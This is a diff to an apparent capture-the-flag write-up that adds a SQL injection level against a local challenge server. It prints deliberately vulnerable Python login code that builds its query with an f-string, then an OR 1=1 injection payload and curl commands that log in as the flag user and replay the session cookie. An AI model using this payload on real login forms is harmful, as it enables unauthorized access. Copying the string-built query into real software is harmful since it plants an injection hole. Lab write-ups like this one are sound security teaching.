@@ -56,3 +56,55 @@ I simply need to skip authentication and provide the user ID,
 ```sh
 curl http://challenge.localhost:80?user=1
 ```
+
+## Level 3 - SQL Injection
+
+Code for this level:
+
+```python
+def level4():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        session["user"] = int(user["rowid"])
+        return redirect(request.path)
+
+    if session.get("user"):
+        user_id = int(session.get("user", -1))
+        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
+        if user:
+            username = user["username"]
+            if username == "flag":
+                return f"{flag}\n"
+            return f"Hello, {username}!\n"
+
+    return form(["username", "password"])
+```
+
+This time, the user is stored in a `session` so we can't send it. Instead, we want to exploit the fact that the `username` and `password` are used to form the SQL string for authenticating the user. I want to change it to something like this;
+
+```sql
+SELECT rowid, * FROM users WHERE username = "flag" AND password = "" OR 1=1 --"
+```
+
+To do this, I use `curl` to login,
+
+```sh
+curl -v -c cookies.dat --data "username=flag" --data "password=%22 OR 1=1 --" -X POST http://challenge.localhost:80
+```
+
+Then I pull the session cookie out and follow the redirect,
+
+```sh
+curl -v -b session=eyJ1c2VyIjoxfQ.ZnCLHA.yyxgmZ5gotlukXOhlRf99GfV4RU http://challenge.localhost:80
+```
